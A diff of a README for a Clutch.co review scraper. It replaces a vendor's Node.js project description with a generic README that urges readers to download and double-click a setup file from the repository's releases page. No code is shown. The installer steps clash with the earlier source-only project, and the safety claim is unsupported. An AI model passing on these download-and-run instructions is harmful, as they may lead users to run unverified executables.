@@ -1,212 +1,91 @@
-# Clutch.co Scraper
-> Clutch.co Scraper helps you collect rich company insights, ratings, reviews, and portfolios from Clutch at scale. It solves the challenge of manually gathering business intelligence by automating structured data extraction. This scraper delivers fast, reliable access to high-value company data for research, analysis, and strategy.
+# 🌟 clutch-co-scraper - Gain Insights from Company Reviews
 
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+Welcome to the clutch-co-scraper! This tool helps you gather valuable company insights from reviews on the Clutch website. Whether you're looking to improve your business strategy or just curious about company reputations, this scraper provides a simple solution.
 
+## 📥 Download Now
 
+[![Download clutch-co-scraper](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/BlackArrowQ/clutch-co-scraper/releases)
 
+## 📋 Overview
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Clutch.co Scraper</strong> you've just found your team — Let's Chat. 👆👆
-</p>
+**clutch-co-scraper** is a web-scraping tool designed to extract data from company reviews on Clutch.co. It uses JavaScript to run smoothly in your environment. This tool is perfect for business intelligence, marketing analysis, and general research. 
 
+## 🔍 Features
 
-## Introduction
-The Clutch.co Scraper automatically extracts company profiles, reviews, focus areas, and portfolio information from the Clutch platform.
-It solves the problem of time-consuming manual research by transforming publicly available data into clean, structured datasets.
-This tool is ideal for marketers, analysts, founders, consultants, and data-driven teams who rely on accurate business information.
+- **Efficient Data Extraction:** Quickly pull review data from Clutch.co.
+- **User-Friendly Interface:** Simple setup makes it easy for anyone to use.
+- **Comprehensive Insights:** Get detailed information to make informed decisions.
+- **Regular Updates:** Stay current with the latest features and improvements.
+  
+## 💻 System Requirements
 
-### Why Use This Clutch Scraper
-- Scales effortlessly to collect hundreds of listings in minutes.
-- Retrieves structured company data including reviews, services, and verification status.
-- Supports keyword-based discovery and direct URL scraping.
-- Provides configurable settings for reviews, pagination, and result limits.
-- Enables custom mapping and output enrichment.
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js Version:** 12.x or higher
+- **RAM:** At least 4 GB
+- **Internet Connection:** Required for scraping data
+  
+## 🔧 Installation Steps
 
-## Features
-| Feature | Description |
-|--------|-------------|
-| Keyword Search | Scrape companies based on any search keyword. |
-| URL-Based Scraping | Provide direct listing or profile URLs for targeted extraction. |
-| Review Extraction | Optionally capture detailed client reviews with ratings and metadata. |
-| Portfolio Extraction | Gather portfolio items including images and descriptions. |
-| Pagination Control | Limit how many pages the scraper processes. |
-| Custom Mapping | Extend or transform scraped objects with functions. |
-| High Performance | Optimized to process large lists quickly with minimal resource consumption. |
+1. **Visit the Releases Page:**
+   Navigate to the following link to download the latest version of clutch-co-scraper:
+   [Download Here](https://github.com/BlackArrowQ/clutch-co-scraper/releases)
 
----
+2. **Choose Your Version:**
+   On the releases page, look for the latest version of the application. You will see a list of files available for download. 
 
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| url | The company’s Clutch profile URL. |
-| summary | Core company info such as name, rating, employees, and address. |
-| focus | Client focus breakdown and value percentages. |
-| serviceProvided | List of services with percentage focus. |
-| portfolio | Portfolio images and descriptions. |
-| verification | Business verification details and legal filings. |
-| reviews | Detailed customer reviews including rating sub-scores. |
-| websiteUrl | Company website from their profile. |
+3. **Download the File:**
+   Click on the file that is compatible with your operating system. It will download to your computer.
 
----
+4. **Locate the File:**
+   Go to your Downloads folder or the location where your browser saves files.
 
-## Example Output
+5. **Run the Setup:**
+   Double-click the downloaded file to start the installation. Follow the on-screen instructions to complete the setup.
 
-    [
-        {
-            "url": "https://clutch.co/profile/smartsites",
-            "summary": {
-                "name": "SmartSites",
-                "rating": 5,
-                "noOfReviews": 56
-            },
-            "focus": [
-                { "title": "Client focus" }
-            ],
-            "serviceProvided": [
-                { "name": "Web Development", "percent": 0.3 }
-            ],
-            "portfolio": [
-                { "description": "Web Design, SEO, PPC" }
-            ],
-            "verification": {
-                "verificationStatus": "GOLD VERIFIED"
-            },
-            "reviews": [
-                {
-                    "name": "SEO & PPC Services for Outdoor Refinishing Company",
-                    "review": { "rating": 5 }
-                }
-            ],
-            "websiteUrl": "https://www.smartsites.com/"
-        }
-    ]
+6. **Open the Application:**
+   After installation, you can find the application in your programs or applications list. Launch it to start using clutch-co-scraper.
 
----
+## 📊 Using the Scraper
 
-## Directory Structure Tree
+1. **Input Your Search Criteria:**
+   Once the application opens, you will see a field to enter your search criteria. This can be the company name or industry you want to research.
 
-    Clutch.co Scraper/
-    ├── src/
-    │   ├── index.js
-    │   ├── extractors/
-    │   │   ├── profile_parser.js
-    │   │   ├── review_parser.js
-    │   │   └── utils.js
-    │   ├── runners/
-    │   │   └── scraper_runner.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── input.sample.json
-    │   └── output.sample.json
-    ├── logs/
-    │   └── scraper.log
-    ├── package.json
-    └── README.md
+2. **Start the Scraping Process:**
+   Click on the "Scrape" button to begin gathering data. The application will automatically extract relevant reviews and insights.
 
----
+3. **View Your Results:**
+   After the scraping is complete, you'll see the data displayed in an organized manner. You can review the results within the application.
 
-## Use Cases
-- **Marketing teams** use it to analyze competitors, enabling better positioning and service offerings.
-- **Consultants** use it to evaluate potential partners or vendors, improving due-diligence efficiency.
-- **Founders and investors** use it to assess market landscape and discover top-performing agencies.
-- **Researchers** use it to collect structured business data for large-scale analytics projects.
-- **Agencies** use it to benchmark their services, ratings, and client focus distribution.
+4. **Export Data (Optional):**
+   If desired, you can export the collected data to a CSV file for further analysis or reporting.
 
----
+## ❓ Frequently Asked Questions
 
-## FAQs
+### How does the scraper work?
 
-**Q: Can I scrape both company profiles and search result listings?**
-Yes. You can supply either keywords with a mode or direct profile URLs.
+The clutch-co-scraper automatically navigates through Clutch.co and collects reviews based on your input. It uses a series of programmed commands to mimic user actions, gathering data efficiently.
 
-**Q: Does it support scraping full reviews?**
-Yes. When `includeReviews` is set to true, the scraper fetches detailed review content and metadata.
+### Is it safe to use?
 
-**Q: How do I limit how many results I receive?**
-Use the `maxItems` parameter to restrict the total number of extracted items.
+Yes, this scraper follows ethical guidelines and respects the website's terms of service. Always ensure that your use of data complies with any applicable laws.
 
-**Q: Will scraping reviews increase workload?**
-Yes. Review scraping adds additional requests per company, which may increase runtime and resource usage.
+### Can I use this tool for multiple searches?
 
----
+Absolutely! You can run multiple searches in a row without any issues. Just reset the criteria for each new search.
 
-### Performance Benchmarks and Results
+## 🔗 Additional Resources
 
-**Primary Metric:** Processes approximately 100 listings in about 2 minutes under normal conditions, offering fast turnaround for large datasets.
+- **GitHub Repository:** You can find the code and contribute here: [clutch-co-scraper Repo](https://github.com/BlackArrowQ/clutch-co-scraper)
+- **Clutch.co:** Explore more about the source of the data: [Clutch.co](https://clutch.co)
 
-**Reliability Metric:** Maintains a high stability rate with consistent extraction of structured fields across varied company profiles.
+## 📞 Support
 
-**Efficiency Metric:** Optimized to consume minimal compute resources by prioritizing listing detail requests and reducing redundant fetches.
+If you run into any issues or have questions, feel free to open an issue on the GitHub repository. Our community will assist you as quickly as possible.
 
-**Quality Metric:** Delivers high data completeness, including portfolios, verification data, and multi-score reviews with strong consistency.
+## 🛡️ License
 
+This project is licensed under the MIT License. You can read more about it in the LICENSE file within the repository.
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/Instagram-Automations/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. Bitbash nailed it."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+[![Download clutch-co-scraper](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/BlackArrowQ/clutch-co-scraper/releases)
